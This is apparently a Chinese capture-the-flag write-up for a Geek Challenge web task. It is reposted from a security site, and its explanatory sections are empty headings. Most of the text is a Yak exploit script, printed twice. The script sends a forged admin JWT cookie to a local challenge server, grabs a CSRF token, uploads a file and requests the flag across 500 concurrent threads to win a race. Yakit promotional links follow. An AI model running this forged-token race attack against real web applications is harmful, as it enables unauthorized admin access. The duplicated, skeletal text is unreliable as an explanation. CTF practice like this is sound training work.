# ​极客大挑战flag保卫战题目WP

> 原文: https://www.ctfiot.com/154585.html
> ID: 154585

题目介绍：

考点：

过程

Step 1

Step 2

Step 3

Yak 代码

// cookie 中的 jwt token 已被替换为 admingetToken = func() { raw = `GET /new-csrf-token HTTP/1.1Host: 127.0.0.1:
8089Cookie: jwt-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.47k0jdPsb9JLdi1kgQxF9Gv4tyCoZ1T5nKZiuODYbbg
`
 rsp, _ = poc.HTTP(raw, poc.https(false))~
 cookie = poc.GetHTTPPacketCookie(rsp, "yak_csrf")
 _, body = poc.Split(rsp)
 return cookie, string(body)}
// cookie 中的 jwt-token 已经被替换为 admin 用户postUpload = func(cookie, token) { raw2 = f`POST /upload HTTP/1.1Host: 127.0.0.1:
8089User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Cookie: jwt-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.47k0jdPsb9JLdi1kgQxF9Gv4tyCoZ1T5nKZiuODYbbg; yak_csrf=${cookie}; Expires="Fri%2C+08+Sep+2023+13%3A19%3A34+GMT"; Max-Age=10; HttpOnly=; SameSite=LaxAccept: */*Referer: http://192.168.124.14:
8089/uploadAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6X-Requested-With: XMLHttpRequestOrigin: http://192.168.124.14:
8089Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryIDPlMGmz86uvgyNMContent-Length: 385
------WebKitFormBoundaryIDPlMGmz86uvgyNMContent-Disposition: form-data; name="filename"; filename="1.zip"Content-Type: text/aa
1------WebKitFormBoundaryIDPlMGmz86uvgyNMContent-Disposition: form-data; name="yak-token"
${token}------WebKitFormBoundaryIDPlMGmz86uvgyNM--
` _, _ = poc.HTTP(raw2, poc.https(false))~}
getFlag = func() { raw = `GET /flag?pass=1111 HTTP/1.1Host: 127.0.0.1:
8089User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
` _, _ = poc.HTTP(raw, poc.https(false))~}
synWg = sync.NewSizedWaitGroup(20)
for i = 0; i < 500; i++ { synWg.Add() go fn { defer synWg.Done()
 cookie, token = getToken() postUpload(cookie, token) getFlag() }}synWg.Wait()

结尾

YAK官方资源

Yak 语言官方教程：https://yaklang.com/docs/intro/Yakit 视频教程：https://space.bilibili.com/437503777Github下载地址：https://github.com/yaklang/yakitYakit官网下载地址：https://yaklang.com/Yakit安装文档：https://yaklang.com/products/download_and_installYakit使用文档：https://yaklang.com/products/intro/常见问题速查：https://yaklang.com/products/FAQ

长按识别添加工作人员

开启Yakit进阶之旅


```
// cookie 中的 jwt token 已被替换为 admingetToken = func() { raw = `GET /new-csrf-token HTTP/1.1Host: 127.0.0.1:
8089Cookie: jwt-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.47k0jdPsb9JLdi1kgQxF9Gv4tyCoZ1T5nKZiuODYbbg
`
 rsp, _ = poc.HTTP(raw, poc.https(false))~
 cookie = poc.GetHTTPPacketCookie(rsp, "yak_csrf")
 _, body = poc.Split(rsp)
 return cookie, string(body)}
// cookie 中的 jwt-token 已经被替换为 admin 用户postUpload = func(cookie, token) { raw2 = f`POST /upload HTTP/1.1Host: 127.0.0.1:
8089User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Cookie: jwt-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.47k0jdPsb9JLdi1kgQxF9Gv4tyCoZ1T5nKZiuODYbbg; yak_csrf=${cookie}; Expires="Fri%2C+08+Sep+2023+13%3A19%3A34+GMT"; Max-Age=10; HttpOnly=; SameSite=LaxAccept: */*Referer: http://192.168.124.14:
8089/uploadAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6X-Requested-With: XMLHttpRequestOrigin: http://192.168.124.14:
8089Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryIDPlMGmz86uvgyNMContent-Length: 385
------WebKitFormBoundaryIDPlMGmz86uvgyNMContent-Disposition: form-data; name="filename"; filename="1.zip"Content-Type: text/aa
1------WebKitFormBoundaryIDPlMGmz86uvgyNMContent-Disposition: form-data; name="yak-token"
${token}------WebKitFormBoundaryIDPlMGmz86uvgyNM--
` _, _ = poc.HTTP(raw2, poc.https(false))~}
getFlag = func() { raw = `GET /flag?pass=1111 HTTP/1.1Host: 127.0.0.1:
8089User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
` _, _ = poc.HTTP(raw, poc.https(false))~}
synWg = sync.NewSizedWaitGroup(20)
for i = 0; i < 500; i++ { synWg.Add() go fn { defer synWg.Done()
 cookie, token = getToken() postUpload(cookie, token) getFlag() }}synWg.Wait()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/7-1704362500.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/8-1704362504.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/1-1704362507.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/6-1704362508.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/9-1704362509.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/7-1704362511.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/0-1704362513.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/7-1704362514.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/2-1704362515.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/9-1704362518.png)